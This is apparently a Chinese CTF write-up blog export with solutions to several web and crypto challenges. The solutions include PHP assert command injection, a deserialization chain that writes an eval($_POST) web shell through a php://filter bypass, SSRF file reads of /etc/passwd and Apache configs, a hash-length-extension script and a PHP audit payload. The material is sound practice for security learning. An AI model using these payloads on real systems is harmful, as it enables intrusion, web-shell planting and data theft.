<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$i</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;i&#x27;</span>]; </span><br><span class="line">    <span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]; </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]!=<span class="string">&quot;Hello World&quot;</span>)&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;die...&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$i</span> == <span class="subst">$u</span>&quot;</span>); </span><br><span class="line">    <span class="comment">// TODO </span></span><br><span class="line">    <span class="comment">// echo $flag;  </span></span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>assert</strong>会造成命令执行，只要注释掉后面的语句就行了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=Hello%20World&amp;i=system(%22cat%20flag.php%22);//</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- TODO --&gt;&lt;?php$flag=&#x27;flag&#123;a0572c90-6aab-42c0-a0c7-2fe5fa4442b3&#125;&#x27;;echo &#x27;&lt;!-- TODO --&gt;&#x27;;</span><br></pre></td></tr></table></figure>
<h3 id="simple-ser">simple ser</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls1</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cls</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$arr</span>; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;arr <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;cls-&gt;<span class="variable">$v</span>; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cls2</span></span>&#123; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$filename</span> = <span class="string">&#x27;hello.php&#x27;</span>; </span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$txt</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="string">&#x27;fileput&#x27;</span>)&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fileput</span>(); </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;p&gt;&#x27;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$key</span>).<span class="string">&#x27;&lt;/p&gt;&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fileput</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(    <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;../&#x27;</span>) !== <span class="literal">false</span> || </span><br><span class="line">            <span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;filename,<span class="string">&#x27;\\&#x27;</span>) !== <span class="literal">false</span>      </span><br><span class="line">        ) <span class="keyword">die</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&#x27;&lt;?php die(\&#x27;stupid\&#x27;); ?&gt;&#x27;</span>; </span><br><span class="line">        <span class="variable">$content</span> .= <span class="variable language_">$this</span>-&gt;txt; </span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;filename, <span class="variable">$content</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$content</span>); </span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))&#123; </span><br><span class="line">    <span class="variable">$cls</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ser&#x27;</span>]); </span><br><span class="line">    <span class="variable">$instance</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$cls</span>); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>(); </span><br><span class="line">    <span class="variable">$a</span>-&gt;<span class="title function_ invoke__">show</span>(); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>根据题意，创建一个<strong>cls1</strong>一个<strong>cls2</strong>对象，使得<strong>cls1-&gt;cls=cls2</strong>即可，最后再使用伪协议绕过得以<strong>die()</strong>。</p>
<p>这里做个笔记，之前<strong>MOCTF</strong>学长出的一道题，死亡退出。</p>
<p>原理是这里使用伪协议打开<strong>south.php</strong>文件，并将前面的<strong>$content</strong>与后面的<strong>Base64</strong>编码合并解码写入文件。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$aa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls1</span>();</span><br><span class="line"><span class="variable">$bb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cls2</span>();</span><br><span class="line"><span class="variable">$bb</span>-&gt;filename = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=south.php&quot;</span>;</span><br><span class="line"><span class="variable">$bb</span>-&gt;txt = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;south&#x27;]);?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$aa</span>-&gt;arr = <span class="keyword">array</span>(<span class="number">1</span>=&gt;<span class="string">&quot;fileput&quot;</span>);</span><br><span class="line"><span class="variable">$aa</span>-&gt;cls = <span class="variable">$bb</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;ser=&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$aa</span>)).<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>此处由于<strong>Base64</strong>的特性，即四个字节为一组解码，且编码字符为大小写字符和数字以及<strong>+</strong>、<strong>/</strong>，因此此处的<strong>&lt;?php
die('stupid');
?&gt;</strong>有效字符只有<strong>12</strong>位，刚好够解码干扰前面的死亡代码，若只有不足<strong>4N</strong>位则需自己添加有效字符凑齐，那么并上后面的<strong>Base64</strong>编码的恶意代码一同解码，就会得到<strong>暝髭꘿i暼?php
system('cat
flag.php');?&gt;</strong>这样的内容写入文件中，从而<strong>Getshell</strong>，而最后<strong>payload</strong>如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ser=Tzo0OiJjbHMxIjoyOntzOjM6ImNscyI7Tzo0OiJjbHMyIjoyOntzOjg6ImZpbGVuYW1lIjtzOjU5OiJwaHA6Ly9maWx0ZXIvd3JpdGU9Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXNvdXRoLnBocCI7czozOiJ0eHQiO3M6NDQ6IlBEOXdhSEFnUUdWMllXd29KRjlRVDFOVVd5ZHpiM1YwYUNkZEtUcy9QZz09Ijt9czozOiJhcnIiO2E6MTp7aToxO3M6NzoiZmlsZXB1dCI7fX0=</span><br></pre></td></tr></table></figure>
<p>连🐎。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b722fe16-38d7-4969-aa2e-e907e69982e2&#125; </span><br></pre></td></tr></table></figure>
<h3 id="买手机">买手机</h3>
<p><strong>RCTF</strong>的原题，<strong>Cpushop</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from pwn import *</span><br><span class="line">import hashpumpy</span><br><span class="line"> </span><br><span class="line">p = remote(&#x27;117.50.13.182&#x27;,8888)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">p.sendline(&quot;2&quot;)</span><br><span class="line">p.recvuntil(&quot;Product ID: &quot;)</span><br><span class="line">p.sendline(&quot;9&quot;)</span><br><span class="line"></span><br><span class="line">payment = p.recv()</span><br><span class="line">sp = payment.find(&#x27;&amp;sign=&#x27;)</span><br><span class="line">sign = payment[sp+6:]</span><br><span class="line">sign = sign[:sign.find(&#x27;\n&#x27;)]</span><br><span class="line">payment = payment[payment.find(&#x27;product&#x27;):payment.find(&#x27;&amp;sign&#x27;)]</span><br><span class="line"> </span><br><span class="line">for keylen in range(8,32):</span><br><span class="line">	log.info(&#x27;trying keylen=&#x27;+str(keylen))</span><br><span class="line"> </span><br><span class="line">	n = hashpumpy.hashpump(sign, payment, &#x27;&amp;price=1&#x27;, keylen)</span><br><span class="line">	order = n[1] + &quot;&amp;sign=&quot;+n[0]</span><br><span class="line"> </span><br><span class="line">	p.sendline(&quot;3&quot;)</span><br><span class="line">	p.recvuntil(&quot;Your order:&quot;)</span><br><span class="line"> 	p.sendline(order)</span><br><span class="line">	p.recv(1000)</span><br><span class="line">  	ret = p.recv(1000)</span><br><span class="line">  	if (&quot;Invalid&quot; not in ret):</span><br><span class="line">    	print(ret)</span><br><span class="line">    	print(p.recvuntil(&quot;Money: &quot;))</span><br><span class="line">    	quit()</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Hash_leNgth_eXt3ns1on_attack_!S)_E@sy&#125;</span><br></pre></td></tr></table></figure>
<h3 id="rsa">RSA</h3>
<p>CTFWIKI上有原题，由于<strong>pq</strong>搞反了，导致跑了一天都没跑出来。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_RSA</span>(<span class="params">cipherfile</span>):</span><br><span class="line">    n = <span class="number">62078208638445817213739226854534031566665495569130972218813975279479576033261</span> 	</span><br><span class="line">    e = <span class="number">9850747023606211927</span> 	</span><br><span class="line">    p = <span class="number">336771668019607304680919844592337860739</span> 	</span><br><span class="line">    q = <span class="number">184333227921154992916659782580114145999</span> 	</span><br><span class="line">    cipher = <span class="built_in">open</span>(cipherfile, <span class="string">&quot;r&quot;</span>).read() 	</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>: 		</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># key = open(privkey, &quot;r&quot;).read()</span></span><br><span class="line">            phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">            d = gmpy2.invert(e, phi)</span><br><span class="line">            <span class="comment"># pubkey = RSA.construct((long(n), long(e)))</span></span><br><span class="line">            privkey = RSA.construct((long(n), long(e), long(d)))</span><br><span class="line">            key = PKCS1_v1_5.new(privkey)</span><br><span class="line">            decrypted = key.decrypt(base64.b64decode(cipher), <span class="literal">None</span>)</span><br><span class="line">            <span class="built_in">print</span> decrypted</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">            <span class="built_in">print</span> ex</span><br><span class="line">            p = gmpy2.next_prime(p**<span class="number">2</span> + q**<span class="number">2</span>)</span><br><span class="line">            q = gmpy2.next_prime(<span class="number">2</span>*p*q)</span><br><span class="line">            e = gmpy2.next_prime(e**<span class="number">2</span>)</span><br><span class="line">            n = long(p)*long(q)</span><br><span class="line">decrypt_RSA(<span class="string">&quot;flag.enc&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;f@cToR__N_bY_!teratlnG!&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 湖湘杯 线上初赛 部分题解</title>
    <url>/2018-HXB-Preliminary/</url>
    <content><![CDATA[<p>由于比赛冲突，湖湘杯也就没什么时间打，匆匆看了一题<strong>SSRF</strong>，以作笔记。</p>
<span id="more"></span>
<h3 id="web">WEB</h3>
<h4 id="readflag">Readflag</h4>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">来骗我的flag呀~</span><br><span class="line"></span><br><span class="line">120.79.236.214:80</span><br></pre></td></tr></table></figure>
<p>打开题目提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssrf me with parameter &#x27;url&#x27;</span><br></pre></td></tr></table></figure>
<p>构造<strong>payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>
<p>可以看到回显，于是尝试读取<strong>Apache</strong>的配置文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///etc/apache2/apache2.conf</span><br></pre></td></tr></table></figure>
<p>得到网站目录信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;Directory /var/www/&gt;</span><br><span class="line">	Options Indexes FollowSymLinks</span><br><span class="line">	AllowOverride None</span><br><span class="line">	Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br></pre></td></tr></table></figure>
<p>尝试直接读取<strong>flag</strong>，但是没有回显。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///var/www/flag</span><br></pre></td></tr></table></figure>
<p>再看配置文件可以得到如下信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#	/etc/apache2/</span><br><span class="line">#	|-- apache2.conf</span><br><span class="line">#	|	**--  ports.conf</span><br><span class="line">#	|-- mods-enabled</span><br><span class="line">#	|	|-- *.load</span><br><span class="line">#	|	**-- *.conf</span><br><span class="line">#	|-- conf-enabled</span><br><span class="line">#	|	**-- *.conf</span><br><span class="line"># 	**-- sites-enabled</span><br><span class="line">#	 	**-- *.conf</span><br></pre></td></tr></table></figure>
<p>读取其他配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=file:///etc/apache2/ports.conf</span><br></pre></td></tr></table></figure>
<p>得到如下信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you just change the port or add more ports here, you will likely also</span><br><span class="line"># have to change the VirtualHost statement in</span><br><span class="line"># /etc/apache2/sites-enabled/000-default.conf</span><br><span class="line"></span><br><span class="line">Listen 80</span><br><span class="line"></span><br><span class="line">&lt;IfModule ssl_module&gt;</span><br><span class="line">	Listen 443</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line">&lt;IfModule mod_gnutls.c&gt;</span><br><span class="line">	Listen 443</span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span><br></pre></td></tr></table></figure>
<p>跟进读取文件信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=file:///etc/apache2/sites-enabled/000-default.conf</span><br></pre></td></tr></table></figure>
<p>得到了<strong>web</strong>服务的真正根目录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DocumentRoot /var/www/html/ssrf/web.php</span><br></pre></td></tr></table></figure>
<p>读取源代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=file:///var/www/html/ssrf/web.php</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;ssrf me with parameter &#x27;url&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line">    <span class="comment">//echo $_GET[&#x27;url&#x27;];</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">//var_dump($_POST);</span></span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]==<span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="variable">$ip</span>==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    		<span class="title function_ invoke__">system</span>(<span class="string">&quot;/var/www/html/ssrf/readflag&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>有一个关键信息<strong>system("/var/www/html/ssrf/readflag");</strong>，然后跟进读取文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=file:///var/www/html/ssrf/readflag</span><br></pre></td></tr></table></figure>
<p>然后得到一个二进制文件，使用<strong>IDA</strong>进行分析，对<strong>main</strong>函数进行反编译之后得到一个关键信息<strong>stream
= fopen("flag", "r");</strong>。</p>
<p>然后读取<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?url=file:///var/www/html/ssrf/flag</span><br></pre></td></tr></table></figure>
<p>得到最终的<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hxb2018&#123;0ef0c0d15f1a44b47af2a01669fbf124&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
        <tag>SSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 Hacklu的一道代码审计</title>
    <url>/2018-Hacklu/</url>
    <content><![CDATA[<p>一道代码审计题，看的我头痛【我的<strong>PHP</strong>实在是太菜了<strong>Orz</strong>。</p>
<span id="more"></span>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;msg&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$msg</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;msg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$msg</span>)!==<span class="string">&quot;Hello Challenge!&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Wow so rude!!!!1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello Hacker! Have a look around.\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$k1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key1&#x27;</span>];</span><br><span class="line">@<span class="variable">$k2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key2&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$cc</span> = <span class="number">1337</span>;<span class="variable">$bb</span> = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$k1</span>) !== <span class="variable">$cc</span> || <span class="variable">$k1</span> === <span class="variable">$cc</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lol no\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$k2</span>) == <span class="variable">$bb</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\d+＄/&#x27;</span>, <span class="variable">$k2</span>) &amp;&amp; !<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$k2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$k2</span> == <span class="variable">$cc</span>)&#123;</span><br><span class="line">            @<span class="variable">$cc</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cc&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>(<span class="variable">$k1</span>,<span class="variable">$k2</span>) = [<span class="variable">$k2</span>, <span class="variable">$k1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cc</span>, <span class="variable">$bb</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$cc</span>))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$lel</span> =&gt; <span class="variable">$hack</span>)&#123;</span><br><span class="line">        <span class="variable">$$lel</span> = <span class="variable">$hack</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">&quot;2&quot;</span>;<span class="variable">$a</span>=<span class="string">&quot;‮b&quot;</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$$a</span> !== <span class="variable">$k1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;lel no\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line"><span class="title function_ invoke__">assert_options</span>(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;<span class="subst">$bb</span> == <span class="subst">$cc</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Good Job ;)&quot;</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;  </span></span><br></pre></td></tr></table></figure>
<p>看到<strong><span
class="math inline">\(_GET[&#39;msg&#39;]**和**file_get_contents(\)</span>msg)!=="Hello
Challenge!"</strong>就知道需要使用<strong>php://input</strong>伪协议来<strong>POST</strong>一个<strong>Hello
Challenge!</strong>绕过。</p>
<p>而<strong>intval($k1) !== $cc || $k1 ===
$cc</strong>就需要<strong>key1=1337</strong>。</p>
<p>后面的<strong>strlen($k2) ==
$bb</strong>，<strong>preg_match('/^＄/', $k2) &amp;&amp;
!is_numeric(<span class="math inline">\(k2)**和**\$k2 ==
\$cc**需要注意的一点是**＄**是全角字符而非半角字符，所以它会匹配**＄**，而不是把它当做一个正则表达式来执行匹配规则【好大的坑，我当初手打的**\)</span></strong>在本地测试了半天。。。然后就是<strong>key2</strong>输入的字符串长度需要是<strong>42</strong>，而<strong>PHP</strong>的弱类型比较只会截取前面是数字的部分，后面包括<strong>＄</strong>的部分会被截断，因此构造的是<strong>key2=1337%ef%bc%8411111111111111111111111111111111111</strong>。</p>
<p>然后交换<strong>k1</strong>和<strong>k2</strong>的值，并从<strong><span
class="math inline">\(cc**截取从**\)</span>bb</strong>即<strong>42</strong>开始到末尾的长度的字符串，并与自身的<strong>sha1</strong>加密的值比较，这里只需要使得<strong>$cc</strong>是个数组就行了，数组<strong>sha1</strong>得到的值是<strong>null</strong>，而字符串截取到空也是<strong>null</strong>，得以绕过。</p>
<p>然后的**foreach ($_GET as $lel =&gt; $hack){$$lel =
$hack;}<strong>会将传入的变量和值不用</strong>$_GET<strong>相应的变量就可以被创建赋值，接下来的一句，推测是用了那种</strong>Unicode<strong>控制字符使其倒序，正序结果是</strong>$b
= "2";$a =
"b";//b=1;<strong>。因此构造的是</strong>cc[]=42&amp;k1=2**。</p>
<p>最后的<strong>assert_options(ASSERT_BAIL,
1);</strong>是开启断言语句失败的时候继续执行指令，然后<strong>assert</strong>可以通过注释后面的语句来造成命令执行，因此传入<strong>bb=var_dump($flag);//</strong>。</p>
<p>最后构造的<strong>Payload</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?msg=php://input&amp;key1=1337a&amp;key2=1337%ef%bc%8411111111111111111111111111111111111&amp;cc[]=42&amp;k1=2&amp;bb=var_dump($flag);// HTTP/1.1</span><br><span class="line">Host: arcade.fluxfingers.net:1819</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">Hello Challenge!</span><br></pre></td></tr></table></figure>
<p>得到<strong>flag</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hello Hacker! Have a look around.</span><br><span class="line">string(38) &quot;flag&#123;7c217708c5293a3264bb136ef1fadd6e&#125;&quot;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>2018 MOCTF欢乐新春赛 部分题解</title>
    <url>/2018-MOCTF/</url>
    <content><![CDATA[<p><strong>MOCTF</strong>欢乐新春赛。</p>
<span id="more"></span>
<h5 id="李华的疑惑.">李华的疑惑.</h5>
<p>打开是一大串<strong>RGB</strong>的颜色值。</p>
